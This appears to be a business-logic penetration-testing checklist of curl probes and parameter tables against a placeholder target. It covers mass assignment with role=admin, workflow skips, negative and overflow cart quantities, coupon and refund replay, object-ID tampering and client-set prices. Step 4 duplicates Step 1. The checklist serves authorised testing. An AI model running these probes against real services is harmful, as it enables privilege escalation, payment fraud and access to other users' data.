# Detection checklist — the business-logic artifacts that name the mechanism, in order

The checklist is the walk — the artifacts in order, the mechanism each one
names, the probe that confirms or falsifies.

## Step 1 — the `register` body

```bash
curl -i -b "$JAR" -X POST "$BASE/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"probe","password":"x","role":"admin"}'
```

| Field | The mechanism | The probe |
|---|---|---|
| `role` | mass assignment | `register` with `role=admin` |
| `isAdmin`/`is_admin`/`admin` | mass assignment | `register` with the field |
| `balance`/`credits`/`wallet` | mass assignment | `register` with the field |
| `verified`/`isVerified`/`is_verified` | mass assignment | `register` with the field |
| `permissions`/`groups`/`scope` | mass assignment | `register` with the field |
| `plan`/`tier`/`subscription` | mass assignment | `register` with the field |
| `flags` | mass assignment | `register` with the field |
| `owner`/`ownerId`/`userId` | mass assignment | `register` with the field |
| `__proto__`/`constructor` | mass assignment | `register` with the field |

## Step 2 — the `workflow` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/confirm" -d 'orderId=1'
curl -i -b "$JAR" -X POST "$BASE/checkout" -d 'step=3&cartId=1'
curl -i -b "$JAR" -X POST "$BASE/redeem" -d 'token=FORGED_STATE'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `step`/`state`/`token` | workflow skip | call the later step |
| `orderId`/`cartId`/`token` | workflow skip | call the later step |
| `code`/`token`/`nonce` | state replay | replay the transition |

## Step 3 — the `arithmetic` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=-1'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=0'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=999999999'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=NaN'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=Infinity'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=-Infinity'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=1e308'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=-0'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=0.1'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=0.0000001'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=1.0'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=1e0'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=1%30'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=0x10'
curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=1,000'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `quantity`/`price`/`amount`/`discount`/`coupon`/`rate` | numeric boundary | send the forbidden value |
| `index`/`offset`/`id` | scaling-after-check | pick the index |
| `unit`/`currency`/`amount` | unit confusion | send the other unit |

## Step 4 — the `registration` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"probe","password":"x","role":"admin"}'
```

| Field | The mechanism | The probe |
|---|---|---|
| `role`/`permissions`/`scope` | role assignment | register with the field |

## Step 5 — the `idempotency` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/redeem" -d 'code=SAVE50'
curl -i -b "$JAR" -X POST "$BASE/redeem" -d 'code=SAVE50'
curl -i -b "$JAR" -X POST "$BASE/refund" -d 'orderId=1'
curl -i -b "$JAR" -X POST "$BASE/refund" -d 'orderId=1'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `refund`/`cancel`/`redeem`/`transfer`/`withdraw`/`deposit`/`invite`/`refer`/`claim` | idempotency | replay the action |

## Step 6 — the `time` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&createdAt=2020-01-01'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&expiry=2030-01-01'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `createdAt`/`expiry`/`timestamp` | time assumption | send the past/future time |

## Step 7 — the `sequence` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&sequence=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&sequence=0'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `sequence`/`nonce`/`id` | sequence assumption | replay an old ID |

## Step 8 — the `ownership` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&objectId=999'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&recordId=999'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&docId=999'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `objectId`/`recordId`/`docId` | ownership assumption | reference another user's object |

## Step 9 — the `singleton` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/admin" -d 'action=create&singleton=1'
curl -i -b "$JAR" -X POST "$BASE/admin" -d 'action=create&singleton=1'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `singleton`/`admin`/`flag` | singleton assumption | create a second privileged object |

## Step 10 — the `echo-back` endpoints

```bash
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&price=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&total=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&discount=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&state=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&token=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&flag=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&header=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&Referer=1'
curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&Origin=1'
```

| Parameter | The mechanism | The probe |
|---|---|---|
| `price`/`total`/`discount`/`state`/`token`/`flag`/`header`/`Referer`/`Origin` | trust-in-earlier-step | modify the upstream value |
